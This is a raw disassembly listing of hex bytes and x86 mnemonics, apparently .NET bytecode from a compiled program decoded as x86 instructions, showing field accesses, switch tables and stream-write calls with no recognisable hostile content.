  4046e7:	bc 00 00 0a 13       	mov    $0x130a0000,%esp
  4046ec:	04 06                	add    $0x6,%al
  4046ee:	17                   	pop    %ss
  4046ef:	58                   	pop    %eax
  4046f0:	0a 08                	or     (%eax),%cl
  4046f2:	11 04 7b             	adc    %eax,(%ebx,%edi,2)
  4046f5:	34 00                	xor    $0x0,%al
  4046f7:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4046fa:	ed                   	in     (%dx),%eax
  4046fb:	00 00                	add    %al,(%eax)
  4046fd:	0a 39                	or     (%ecx),%bh
  4046ff:	07                   	pop    %es
  404700:	00 00                	add    %al,(%eax)
  404702:	00 06                	add    %al,(%esi)
  404704:	0b dd                	or     %ebp,%ebx
  404706:	1c 00                	sbb    $0x0,%al
  404708:	00 00                	add    %al,(%eax)
  40470a:	12 03                	adc    (%ebx),%al
  40470c:	28 be 00 00 0a 2d    	sub    %bh,0x2d0a0000(%esi)
  404712:	d1 dd                	rcr    $1,%ebp
  404714:	0e                   	push   %cs
  404715:	00 00                	add    %al,(%eax)
  404717:	00 12                	add    %dl,(%edx)
  404719:	03 fe                	add    %esi,%edi
  40471b:	16                   	push   %ss
  40471c:	04 00                	add    $0x0,%al
  40471e:	00 1b                	add    %bl,(%ebx)
  404720:	6f                   	outsl  %ds:(%esi),(%dx)
  404721:	33 00                	xor    (%eax),%eax
  404723:	00 0a                	add    %cl,(%edx)
  404725:	dc 07                	faddl  (%edi)
  404727:	2a 01                	sub    (%ecx),%al
  404729:	10 00                	adc    %al,(%eax)
  40472b:	00 02                	add    %al,(%edx)
  40472d:	00 17                	add    %dl,(%edi)
  40472f:	00 39                	add    %bh,(%ecx)
  404731:	50                   	push   %eax
  404732:	00 0e                	add    %cl,(%esi)
  404734:	00 00                	add    %al,(%eax)
  404736:	00 00                	add    %al,(%eax)
  404738:	13 30                	adc    (%eax),%esi
  40473a:	02 00                	add    (%eax),%al
  40473c:	1e                   	push   %ds
  40473d:	00 00                	add    %al,(%eax)
  40473f:	00 01                	add    %al,(%ecx)
  404741:	00 00                	add    %al,(%eax)
  404743:	11 02                	adc    %eax,(%edx)
  404745:	03 28                	add    (%eax),%ebp
  404747:	6d                   	insl   (%dx),%es:(%edi)
  404748:	00 00                	add    %al,(%eax)
  40474a:	06                   	push   %es
  40474b:	0a 06                	or     (%esi),%al
  40474d:	15 40 02 00 00       	adc    $0x240,%eax
  404752:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  404755:	02 7b 38             	add    0x38(%ebx),%bh
  404758:	00 00                	add    %al,(%eax)
  40475a:	04 06                	add    $0x6,%al
  40475c:	6f                   	outsl  %ds:(%esi),(%dx)
  40475d:	ea 00 00 0a 2a 00 00 	ljmp   $0x0,$0x2a0a0000
  404764:	13 30                	adc    (%eax),%esi
  404766:	04 00                	add    $0x0,%al
  404768:	bc 00 00 00 1f       	mov    $0x1f000000,%esp
  40476d:	00 00                	add    %al,(%eax)
  40476f:	11 02                	adc    %eax,(%edx)
  404771:	7b 38                	jnp    0x4047ab
  404773:	00 00                	add    %al,(%eax)
  404775:	04 6f                	add    $0x6f,%al
  404777:	eb 00                	jmp    0x404779
  404779:	00 0a                	add    %cl,(%edx)
  40477b:	0a 06                	or     (%esi),%al
  40477d:	1f                   	pop    %ds
  40477e:	0f 3d                	(bad)
  404780:	16                   	push   %ss
  404781:	00 00                	add    %al,(%eax)
  404783:	00 20                	add    %ah,(%eax)
  404785:	80 00 00             	addb   $0x0,(%eax)
  404788:	00 06                	add    %al,(%esi)
  40478a:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  40478d:	0b 03                	or     (%ebx),%eax
  40478f:	07                   	pop    %es
  404790:	6f                   	outsl  %ds:(%esi),(%dx)
  404791:	ee                   	out    %al,(%dx)
  404792:	00 00                	add    %al,(%eax)
  404794:	0a 38                	or     (%eax),%bh
  404796:	59                   	pop    %ecx
  404797:	00 00                	add    %al,(%eax)
  404799:	00 06                	add    %al,(%esi)
  40479b:	20 ff                	and    %bh,%bh
  40479d:	ff 00                	incl   (%eax)
  40479f:	00 3d 2a 00 00 00    	add    %bh,0x2a
  4047a5:	20 de                	and    %bl,%dh
  4047a7:	00 00                	add    %al,(%eax)
  4047a9:	00 0b                	add    %cl,(%ebx)
  4047ab:	03 07                	add    (%edi),%eax
  4047ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4047ae:	ee                   	out    %al,(%dx)
  4047af:	00 00                	add    %al,(%eax)
  4047b1:	0a 06                	or     (%esi),%al
  4047b3:	68 28 ef 00 00       	push   $0xef28
  4047b8:	0a 28                	or     (%eax),%ch
  4047ba:	58                   	pop    %eax
  4047bb:	00 00                	add    %al,(%eax)
  4047bd:	06                   	push   %es
  4047be:	0c 03                	or     $0x3,%al
  4047c0:	08 16                	or     %dl,(%esi)
  4047c2:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4047c8:	00 0a                	add    %cl,(%edx)
  4047ca:	38 24 00             	cmp    %ah,(%eax,%eax,1)
  4047cd:	00 00                	add    %al,(%eax)
  4047cf:	20 df                	and    %bl,%bh
  4047d1:	00 00                	add    %al,(%eax)
  4047d3:	00 0b                	add    %cl,(%ebx)
  4047d5:	03 07                	add    (%edi),%eax
  4047d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4047d8:	ee                   	out    %al,(%dx)
  4047d9:	00 00                	add    %al,(%eax)
  4047db:	0a 06                	or     (%esi),%al
  4047dd:	28 4a 00             	sub    %cl,0x0(%edx)
  4047e0:	00 0a                	add    %cl,(%edx)
  4047e2:	28 58 00             	sub    %bl,0x0(%eax)
  4047e5:	00 06                	add    %al,(%esi)
  4047e7:	0c 03                	or     $0x3,%al
  4047e9:	08 16                	or     %dl,(%esi)
  4047eb:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4047f1:	00 0a                	add    %cl,(%edx)
  4047f3:	16                   	push   %ss
  4047f4:	0d 38 2d 00 00       	or     $0x2d38,%eax
  4047f9:	00 03                	add    %al,(%ebx)
  4047fb:	02 7b 38             	add    0x38(%ebx),%bh
  4047fe:	00 00                	add    %al,(%eax)
  404800:	04 09                	add    $0x9,%al
  404802:	6f                   	outsl  %ds:(%esi),(%dx)
  404803:	ea 00 00 0a 7b 33 00 	ljmp   $0x33,$0x7b0a0000
  40480a:	00 04 28             	add    %al,(%eax,%ebp,1)
  40480d:	9a 00 00 06 02 7b 38 	lcall  $0x387b,$0x2060000
  404814:	00 00                	add    %al,(%eax)
  404816:	04 09                	add    $0x9,%al
  404818:	6f                   	outsl  %ds:(%esi),(%dx)
  404819:	ea 00 00 0a 03 6f 8a 	ljmp   $0x8a6f,$0x30a0000
  404820:	00 00                	add    %al,(%eax)
  404822:	06                   	push   %es
  404823:	09 17                	or     %edx,(%edi)
  404825:	58                   	pop    %eax
  404826:	0d 09 06 32 cf       	or     $0xcf320609,%eax
  40482b:	2a 13                	sub    (%ebx),%dl
  40482d:	30 04 00             	xor    %al,(%eax,%eax,1)
  404830:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404831:	00 00                	add    %al,(%eax)
  404833:	00 1f                	add    %bl,(%edi)
  404835:	00 00                	add    %al,(%eax)
  404837:	11 02                	adc    %eax,(%edx)
  404839:	7b 38                	jnp    0x404873
  40483b:	00 00                	add    %al,(%eax)
  40483d:	04 6f                	add    $0x6f,%al
  40483f:	eb 00                	jmp    0x404841
  404841:	00 0a                	add    %cl,(%edx)
  404843:	0a 06                	or     (%esi),%al
  404845:	1f                   	pop    %ds
  404846:	0f 3d                	(bad)
  404848:	16                   	push   %ss
  404849:	00 00                	add    %al,(%eax)
  40484b:	00 20                	add    %ah,(%eax)
  40484d:	90                   	nop
  40484e:	00 00                	add    %al,(%eax)
  404850:	00 06                	add    %al,(%esi)
  404852:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  404855:	0b 03                	or     (%ebx),%eax
  404857:	07                   	pop    %es
  404858:	6f                   	outsl  %ds:(%esi),(%dx)
  404859:	ee                   	out    %al,(%dx)
  40485a:	00 00                	add    %al,(%eax)
  40485c:	0a 38                	or     (%eax),%bh
  40485e:	59                   	pop    %ecx
  40485f:	00 00                	add    %al,(%eax)
  404861:	00 06                	add    %al,(%esi)
  404863:	20 ff                	and    %bh,%bh
  404865:	ff 00                	incl   (%eax)
  404867:	00 3d 2a 00 00 00    	add    %bh,0x2a
  40486d:	20 dc                	and    %bl,%ah
  40486f:	00 00                	add    %al,(%eax)
  404871:	00 0b                	add    %cl,(%ebx)
  404873:	03 07                	add    (%edi),%eax
  404875:	6f                   	outsl  %ds:(%esi),(%dx)
  404876:	ee                   	out    %al,(%dx)
  404877:	00 00                	add    %al,(%eax)
  404879:	0a 06                	or     (%esi),%al
  40487b:	68 28 ef 00 00       	push   $0xef28
  404880:	0a 28                	or     (%eax),%ch
  404882:	58                   	pop    %eax
  404883:	00 00                	add    %al,(%eax)
  404885:	06                   	push   %es
  404886:	0c 03                	or     $0x3,%al
  404888:	08 16                	or     %dl,(%esi)
  40488a:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  404890:	00 0a                	add    %cl,(%edx)
  404892:	38 24 00             	cmp    %ah,(%eax,%eax,1)
  404895:	00 00                	add    %al,(%eax)
  404897:	20 dd                	and    %bl,%ch
  404899:	00 00                	add    %al,(%eax)
  40489b:	00 0b                	add    %cl,(%ebx)
  40489d:	03 07                	add    (%edi),%eax
  40489f:	6f                   	outsl  %ds:(%esi),(%dx)
  4048a0:	ee                   	out    %al,(%dx)
  4048a1:	00 00                	add    %al,(%eax)
  4048a3:	0a 06                	or     (%esi),%al
  4048a5:	28 4a 00             	sub    %cl,0x0(%edx)
  4048a8:	00 0a                	add    %cl,(%edx)
  4048aa:	28 58 00             	sub    %bl,0x0(%eax)
  4048ad:	00 06                	add    %al,(%esi)
  4048af:	0c 03                	or     $0x3,%al
  4048b1:	08 16                	or     %dl,(%esi)
  4048b3:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4048b9:	00 0a                	add    %cl,(%edx)
  4048bb:	16                   	push   %ss
  4048bc:	0d 38 16 00 00       	or     $0x1638,%eax
  4048c1:	00 02                	add    %al,(%edx)
  4048c3:	7b 38                	jnp    0x4048fd
  4048c5:	00 00                	add    %al,(%eax)
  4048c7:	04 09                	add    $0x9,%al
  4048c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4048ca:	ea 00 00 0a 03 6f 8a 	ljmp   $0x8a6f,$0x30a0000
  4048d1:	00 00                	add    %al,(%eax)
  4048d3:	06                   	push   %es
  4048d4:	09 17                	or     %edx,(%edi)
  4048d6:	58                   	pop    %eax
  4048d7:	0d 09 06 32 e6       	or     $0xe6320609,%eax
  4048dc:	2a 00                	sub    (%eax),%al
  4048de:	00 00                	add    %al,(%eax)
  4048e0:	13 30                	adc    (%eax),%esi
  4048e2:	02 00                	add    (%eax),%al
  4048e4:	99                   	cltd
  4048e5:	00 00                	add    %al,(%eax)
  4048e7:	00 20                	add    %ah,(%eax)
  4048e9:	00 00                	add    %al,(%eax)
  4048eb:	11 02                	adc    %eax,(%edx)
  4048ed:	7b 36                	jnp    0x404925
  4048ef:	00 00                	add    %al,(%eax)
  4048f1:	04 0a                	add    $0xa,%al
  4048f3:	06                   	push   %es
  4048f4:	1a 59 45             	sbb    0x45(%ecx),%bl
  4048f7:	07                   	pop    %es
  4048f8:	00 00                	add    %al,(%eax)
  4048fa:	00 22                	add    %ah,(%edx)
  4048fc:	00 00                	add    %al,(%eax)
  4048fe:	00 05 00 00 00 16    	add    %al,0x16000000
  404904:	00 00                	add    %al,(%eax)
  404906:	00 6b 00             	add    %ch,0x0(%ebx)
  404909:	00 00                	add    %al,(%eax)
  40490b:	38 00                	cmp    %al,(%eax)
  40490d:	00 00                	add    %al,(%eax)
  40490f:	49                   	dec    %ecx
  404910:	00 00                	add    %al,(%eax)
  404912:	00 5a 00             	add    %bl,0x0(%edx)
  404915:	00 00                	add    %al,(%eax)
  404917:	38 66 00             	cmp    %ah,0x0(%esi)
  40491a:	00 00                	add    %al,(%eax)
  40491c:	02 7b 35             	add    0x35(%ebx),%bh
  40491f:	00 00                	add    %al,(%eax)
  404921:	04 a5                	add    $0xa5,%al
  404923:	68 00 00 01 28       	push   $0x28010000
  404928:	f0 00 00             	lock add %al,(%eax)
  40492b:	0a 2a                	or     (%edx),%ch
  40492d:	02 7b 35             	add    0x35(%ebx),%bh
  404930:	00 00                	add    %al,(%eax)
  404932:	04 a5                	add    $0xa5,%al
  404934:	95                   	xchg   %eax,%ebp
  404935:	00 00                	add    %al,(%eax)
  404937:	01 2a                	add    %ebp,(%edx)
  404939:	02 7b 35             	add    0x35(%ebx),%bh
  40493c:	00 00                	add    %al,(%eax)
  40493e:	04 6f                	add    $0x6f,%al
  404940:	38 00                	cmp    %al,(%eax)
  404942:	00 0a                	add    %cl,(%edx)
  404944:	6f                   	outsl  %ds:(%esi),(%dx)
  404945:	f1                   	int1
  404946:	00 00                	add    %al,(%eax)
  404948:	0a 28                	or     (%eax),%ch
  40494a:	f2 00 00             	repnz add %al,(%eax)
  40494d:	0a 2a                	or     (%edx),%ch
  40494f:	02 7b 35             	add    0x35(%ebx),%bh
  404952:	00 00                	add    %al,(%eax)
  404954:	04 a5                	add    $0xa5,%al
  404956:	96                   	xchg   %eax,%esi
  404957:	00 00                	add    %al,(%eax)
  404959:	01 28                	add    %ebp,(%eax)
  40495b:	f3 00 00             	repz add %al,(%eax)
  40495e:	0a 2a                	or     (%edx),%ch
  404960:	02 7b 35             	add    0x35(%ebx),%bh
  404963:	00 00                	add    %al,(%eax)
  404965:	04 a5                	add    $0xa5,%al
  404967:	97                   	xchg   %eax,%edi
  404968:	00 00                	add    %al,(%eax)
  40496a:	01 28                	add    %ebp,(%eax)
  40496c:	f4                   	hlt
  40496d:	00 00                	add    %al,(%eax)
  40496f:	0a 2a                	or     (%edx),%ch
  404971:	02 7b 35             	add    0x35(%ebx),%bh
  404974:	00 00                	add    %al,(%eax)
  404976:	04 a5                	add    $0xa5,%al
  404978:	6b 00 00             	imul   $0x0,(%eax),%eax
  40497b:	01 28                	add    %ebp,(%eax)
  40497d:	f5                   	cmc
  40497e:	00 00                	add    %al,(%eax)
  404980:	0a 2a                	or     (%edx),%ch
  404982:	16                   	push   %ss
  404983:	6a 2a                	push   $0x2a
  404985:	00 00                	add    %al,(%eax)
  404987:	00 13                	add    %dl,(%ebx)
  404989:	30 02                	xor    %al,(%edx)
  40498b:	00 99 00 00 00 20    	add    %bl,0x20000000(%ecx)
  404991:	00 00                	add    %al,(%eax)
  404993:	11 02                	adc    %eax,(%edx)
  404995:	7b 36                	jnp    0x4049cd
  404997:	00 00                	add    %al,(%eax)
  404999:	04 0a                	add    $0xa,%al
  40499b:	06                   	push   %es
  40499c:	1a 59 45             	sbb    0x45(%ecx),%bl
  40499f:	07                   	pop    %es
  4049a0:	00 00                	add    %al,(%eax)
  4049a2:	00 22                	add    %ah,(%edx)
  4049a4:	00 00                	add    %al,(%eax)
  4049a6:	00 05 00 00 00 11    	add    %al,0x11000000
  4049ac:	00 00                	add    %al,(%eax)
  4049ae:	00 6b 00             	add    %ch,0x0(%ebx)
  4049b1:	00 00                	add    %al,(%eax)
  4049b3:	38 00                	cmp    %al,(%eax)
  4049b5:	00 00                	add    %al,(%eax)
  4049b7:	49                   	dec    %ecx
  4049b8:	00 00                	add    %al,(%eax)
  4049ba:	00 5a 00             	add    %bl,0x0(%edx)
  4049bd:	00 00                	add    %al,(%eax)
  4049bf:	38 66 00             	cmp    %ah,0x0(%esi)
  4049c2:	00 00                	add    %al,(%eax)
  4049c4:	02 7b 35             	add    0x35(%ebx),%bh
  4049c7:	00 00                	add    %al,(%eax)
  4049c9:	04 a5                	add    $0xa5,%al
  4049cb:	68 00 00 01 2a       	push   $0x2a010000
  4049d0:	02 7b 35             	add    0x35(%ebx),%bh
  4049d3:	00 00                	add    %al,(%eax)
  4049d5:	04 a5                	add    $0xa5,%al
  4049d7:	68 00 00 01 28       	push   $0x28010000
  4049dc:	f6 00 00             	testb  $0x0,(%eax)
  4049df:	0a 2a                	or     (%edx),%ch
  4049e1:	02 7b 35             	add    0x35(%ebx),%bh
  4049e4:	00 00                	add    %al,(%eax)
  4049e6:	04 6f                	add    $0x6f,%al
  4049e8:	38 00                	cmp    %al,(%eax)
  4049ea:	00 0a                	add    %cl,(%edx)
  4049ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4049ed:	f1                   	int1
  4049ee:	00 00                	add    %al,(%eax)
  4049f0:	0a 28                	or     (%eax),%ch
  4049f2:	f7 00 00 0a 2a 02    	testl  $0x22a0a00,(%eax)
  4049f8:	7b 35                	jnp    0x404a2f
  4049fa:	00 00                	add    %al,(%eax)
  4049fc:	04 a5                	add    $0xa5,%al
  4049fe:	96                   	xchg   %eax,%esi
  4049ff:	00 00                	add    %al,(%eax)
  404a01:	01 28                	add    %ebp,(%eax)
  404a03:	f8                   	clc
  404a04:	00 00                	add    %al,(%eax)
  404a06:	0a 2a                	or     (%edx),%ch
  404a08:	02 7b 35             	add    0x35(%ebx),%bh
  404a0b:	00 00                	add    %al,(%eax)
  404a0d:	04 a5                	add    $0xa5,%al
  404a0f:	97                   	xchg   %eax,%edi
  404a10:	00 00                	add    %al,(%eax)
  404a12:	01 28                	add    %ebp,(%eax)
  404a14:	f9                   	stc
  404a15:	00 00                	add    %al,(%eax)
  404a17:	0a 2a                	or     (%edx),%ch
  404a19:	02 7b 35             	add    0x35(%ebx),%bh
  404a1c:	00 00                	add    %al,(%eax)
  404a1e:	04 a5                	add    $0xa5,%al
  404a20:	6b 00 00             	imul   $0x0,(%eax),%eax
  404a23:	01 28                	add    %ebp,(%eax)
  404a25:	fa                   	cli
  404a26:	00 00                	add    %al,(%eax)
  404a28:	0a 2a                	or     (%edx),%ch
  404a2a:	16                   	push   %ss
  404a2b:	6a 2a                	push   $0x2a
  404a2d:	00 00                	add    %al,(%eax)
  404a2f:	00 13                	add    %dl,(%ebx)
  404a31:	30 02                	xor    %al,(%edx)
  404a33:	00 87 00 00 00 20    	add    %al,0x20000000(%edi)
  404a39:	00 00                	add    %al,(%eax)
  404a3b:	11 02                	adc    %eax,(%edx)
  404a3d:	7b 36                	jnp    0x404a75
  404a3f:	00 00                	add    %al,(%eax)
  404a41:	04 0a                	add    $0xa,%al
  404a43:	06                   	push   %es
  404a44:	1a 59 45             	sbb    0x45(%ecx),%bl
  404a47:	07                   	pop    %es
  404a48:	00 00                	add    %al,(%eax)
  404a4a:	00 16                	add    %dl,(%esi)
  404a4c:	00 00                	add    %al,(%eax)
  404a4e:	00 05 00 00 00 52    	add    %al,0x52000000
  404a54:	00 00                	add    %al,(%eax)
  404a56:	00 52 00             	add    %dl,0x0(%edx)
  404a59:	00 00                	add    %al,(%eax)
  404a5b:	27                   	daa
  404a5c:	00 00                	add    %al,(%eax)
  404a5e:	00 33                	add    %dh,(%ebx)
  404a60:	00 00                	add    %al,(%eax)
  404a62:	00 40 00             	add    %al,0x0(%eax)
  404a65:	00 00                	add    %al,(%eax)
  404a67:	38 4d 00             	cmp    %cl,0x0(%ebp)
  404a6a:	00 00                	add    %al,(%eax)
  404a6c:	02 7b 35             	add    0x35(%ebx),%bh
  404a6f:	00 00                	add    %al,(%eax)
  404a71:	04 a5                	add    $0xa5,%al
  404a73:	68 00 00 01 28       	push   $0x28010000
  404a78:	fb                   	sti
  404a79:	00 00                	add    %al,(%eax)
  404a7b:	0a 2a                	or     (%edx),%ch
  404a7d:	02 7b 35             	add    0x35(%ebx),%bh
  404a80:	00 00                	add    %al,(%eax)
  404a82:	04 74                	add    $0x74,%al
  404a84:	38 00                	cmp    %al,(%eax)
  404a86:	00 01                	add    %al,(%ecx)
  404a88:	28 fc                	sub    %bh,%ah
  404a8a:	00 00                	add    %al,(%eax)
  404a8c:	0a 2a                	or     (%edx),%ch
  404a8e:	02 7b 35             	add    0x35(%ebx),%bh
  404a91:	00 00                	add    %al,(%eax)
  404a93:	04 a5                	add    $0xa5,%al
  404a95:	96                   	xchg   %eax,%esi
  404a96:	00 00                	add    %al,(%eax)
  404a98:	01 2a                	add    %ebp,(%edx)
  404a9a:	02 7b 35             	add    0x35(%ebx),%bh
  404a9d:	00 00                	add    %al,(%eax)
  404a9f:	04 a5                	add    $0xa5,%al
  404aa1:	97                   	xchg   %eax,%edi
  404aa2:	00 00                	add    %al,(%eax)
  404aa4:	01 6c 2a 02          	add    %ebp,0x2(%edx,%ebp,1)
  404aa8:	7b 35                	jnp    0x404adf
  404aaa:	00 00                	add    %al,(%eax)
  404aac:	04 a5                	add    $0xa5,%al
  404aae:	6b 00 00             	imul   $0x0,(%eax),%eax
  404ab1:	01 28                	add    %ebp,(%eax)
  404ab3:	fa                   	cli
  404ab4:	00 00                	add    %al,(%eax)
  404ab6:	0a 6c 2a 23          	or     0x23(%edx,%ebp,1),%ch
	...
  404ac2:	2a 00                	sub    (%eax),%al
  404ac4:	13 30                	adc    (%eax),%esi
  404ac6:	02 00                	add    (%eax),%al
  404ac8:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404ac9:	00 00                	add    %al,(%eax)
  404acb:	00 21                	add    %ah,(%ecx)
  404acd:	00 00                	add    %al,(%eax)
  404acf:	11 02                	adc    %eax,(%edx)
  404ad1:	7b 36                	jnp    0x404b09
  404ad3:	00 00                	add    %al,(%eax)
  404ad5:	04 0a                	add    $0xa,%al
  404ad7:	06                   	push   %es
  404ad8:	1a 59 45             	sbb    0x45(%ecx),%bl
  404adb:	08 00                	or     %al,(%eax)
  404add:	00 00                	add    %al,(%eax)
  404adf:	16                   	push   %ss
  404ae0:	00 00                	add    %al,(%eax)
  404ae2:	00 05 00 00 00 6e    	add    %al,0x6e000000
  404ae8:	00 00                	add    %al,(%eax)
  404aea:	00 6e 00             	add    %ch,0x0(%esi)
  404aed:	00 00                	add    %al,(%eax)
  404aef:	27                   	daa
  404af0:	00 00                	add    %al,(%eax)
  404af2:	00 38                	add    %bh,(%eax)
  404af4:	00 00                	add    %al,(%eax)
  404af6:	00 49 00             	add    %cl,0x0(%ecx)
  404af9:	00 00                	add    %al,(%eax)
  404afb:	62 00                	bound  %eax,(%eax)
  404afd:	00 00                	add    %al,(%eax)
  404aff:	38 69 00             	cmp    %ch,0x0(%ecx)
  404b02:	00 00                	add    %al,(%eax)
  404b04:	02 7b 35             	add    0x35(%ebx),%bh
  404b07:	00 00                	add    %al,(%eax)
  404b09:	04 a5                	add    $0xa5,%al
  404b0b:	68 00 00 01 28       	push   $0x28010000
  404b10:	e7 00                	out    %eax,$0x0
  404b12:	00 0a                	add    %cl,(%edx)
  404b14:	2a 02                	sub    (%edx),%al
  404b16:	7b 35                	jnp    0x404b4d
  404b18:	00 00                	add    %al,(%eax)
  404b1a:	04 6f                	add    $0x6f,%al
  404b1c:	38 00                	cmp    %al,(%eax)
  404b1e:	00 0a                	add    %cl,(%edx)
  404b20:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  404b24:	06                   	push   %es
  404b25:	2a 02                	sub    (%edx),%al
  404b27:	7b 35                	jnp    0x404b5e
  404b29:	00 00                	add    %al,(%eax)
  404b2b:	04 a5                	add    $0xa5,%al
  404b2d:	96                   	xchg   %eax,%esi
  404b2e:	00 00                	add    %al,(%eax)
  404b30:	01 28                	add    %ebp,(%eax)
  404b32:	e8 00 00 0a 2a       	call   0x2a4a4b37
  404b37:	02 7b 35             	add    0x35(%ebx),%bh
  404b3a:	00 00                	add    %al,(%eax)
  404b3c:	04 a5                	add    $0xa5,%al
  404b3e:	97                   	xchg   %eax,%edi
  404b3f:	00 00                	add    %al,(%eax)
  404b41:	01 28                	add    %ebp,(%eax)
  404b43:	fd                   	std
  404b44:	00 00                	add    %al,(%eax)
  404b46:	0a 2a                	or     (%edx),%ch
  404b48:	02 7b 35             	add    0x35(%ebx),%bh
  404b4b:	00 00                	add    %al,(%eax)
  404b4d:	04 a5                	add    $0xa5,%al
  404b4f:	6b 00 00             	imul   $0x0,(%eax),%eax
  404b52:	01 0b                	add    %ecx,(%ebx)
  404b54:	12 01                	adc    (%ecx),%al
  404b56:	28 fe                	sub    %bh,%dh
  404b58:	00 00                	add    %al,(%eax)
  404b5a:	0a 28                	or     (%eax),%ch
  404b5c:	e7 00                	out    %eax,$0x0
  404b5e:	00 0a                	add    %cl,(%edx)
  404b60:	2a 02                	sub    (%edx),%al
  404b62:	7b 35                	jnp    0x404b99
  404b64:	00 00                	add    %al,(%eax)
  404b66:	04 74                	add    $0x74,%al
  404b68:	02 00                	add    (%eax),%al
  404b6a:	00 1b                	add    %bl,(%ebx)
  404b6c:	2a 16                	sub    (%esi),%dl
  404b6e:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404b72:	01 2a                	add    %ebp,(%edx)
  404b74:	13 30                	adc    (%eax),%esi
  404b76:	04 00                	add    $0x0,%al
  404b78:	4b                   	dec    %ebx
  404b79:	00 00                	add    %al,(%eax)
  404b7b:	00 22                	add    %ah,(%edx)
  404b7d:	00 00                	add    %al,(%eax)
  404b7f:	11 03                	adc    %eax,(%ebx)
  404b81:	28 6a 00             	sub    %ch,0x0(%edx)
  404b84:	00 0a                	add    %cl,(%edx)
  404b86:	39 3e                	cmp    %edi,(%esi)
  404b88:	00 00                	add    %al,(%eax)
  404b8a:	00 14 0a             	add    %dl,(%edx,%ecx,1)
  404b8d:	03 19                	add    (%ecx),%ebx
  404b8f:	17                   	pop    %ss
  404b90:	17                   	pop    %ss
  404b91:	73 ff                	jae    0x404b92
  404b93:	00 00                	add    %al,(%eax)
  404b95:	0a 0b                	or     (%ebx),%cl
  404b97:	07                   	pop    %es
  404b98:	6f                   	outsl  %ds:(%esi),(%dx)
  404b99:	e2 00                	loop   0x404b9b
  404b9b:	00 0a                	add    %cl,(%edx)
  404b9d:	d4 8d                	aam    $0x8d
  404b9f:	44                   	inc    %esp
  404ba0:	00 00                	add    %al,(%eax)
  404ba2:	01 0a                	add    %ecx,(%edx)
  404ba4:	07                   	pop    %es
  404ba5:	06                   	push   %es
  404ba6:	16                   	push   %ss
  404ba7:	07                   	pop    %es
  404ba8:	6f                   	outsl  %ds:(%esi),(%dx)
  404ba9:	e2 00                	loop   0x404bab
  404bab:	00 0a                	add    %cl,(%edx)
  404bad:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  404bb4:	07                   	pop    %es
  404bb5:	6f                   	outsl  %ds:(%esi),(%dx)
  404bb6:	9f                   	lahf
  404bb7:	00 00                	add    %al,(%eax)
  404bb9:	0a 07                	or     (%edi),%al
  404bbb:	6f                   	outsl  %ds:(%esi),(%dx)
  404bbc:	40                   	inc    %eax
  404bbd:	00 00                	add    %al,(%eax)
  404bbf:	0a 02                	or     (%edx),%al
  404bc1:	06                   	push   %es
  404bc2:	28 79 00             	sub    %bh,0x0(%ecx)
  404bc5:	00 06                	add    %al,(%esi)
  404bc7:	17                   	pop    %ss
  404bc8:	2a 16                	sub    (%esi),%dl
  404bca:	2a 00                	sub    (%eax),%al
  404bcc:	13 30                	adc    (%eax),%esi
  404bce:	05 00 40 00 00       	add    $0x4000,%eax
  404bd3:	00 00                	add    %al,(%eax)
  404bd5:	00 00                	add    %al,(%eax)
  404bd7:	00 02                	add    %al,(%edx)
  404bd9:	7b 35                	jnp    0x404c10
  404bdb:	00 00                	add    %al,(%eax)
  404bdd:	04 39                	add    $0x39,%al
  404bdf:	33 00                	xor    (%eax),%eax
  404be1:	00 00                	add    %al,(%eax)
  404be3:	03 1c 73             	add    (%ebx,%esi,2),%ebx
  404be6:	6c                   	insb   (%dx),%es:(%edi)
  404be7:	00 00                	add    %al,(%eax)
  404be9:	0a 25 02 7b 35 00    	or     0x357b02,%ah
  404bef:	00 04 74             	add    %al,(%esp,%esi,2)
  404bf2:	02 00                	add    (%eax),%al
  404bf4:	00 1b                	add    %bl,(%ebx)
  404bf6:	16                   	push   %ss
  404bf7:	02 7b 35             	add    0x35(%ebx),%bh
  404bfa:	00 00                	add    %al,(%eax)
  404bfc:	04 74                	add    $0x74,%al
  404bfe:	02 00                	add    (%eax),%al
  404c00:	00 1b                	add    %bl,(%ebx)
  404c02:	8e 69 6f             	mov    0x6f(%ecx),%gs
  404c05:	4c                   	dec    %esp
  404c06:	00 00                	add    %al,(%eax)
  404c08:	0a 25 6f 9f 00 00    	or     0x9f6f,%ah
  404c0e:	0a 6f 40             	or     0x40(%edi),%ch
  404c11:	00 00                	add    %al,(%eax)
  404c13:	0a 17                	or     (%edi),%dl
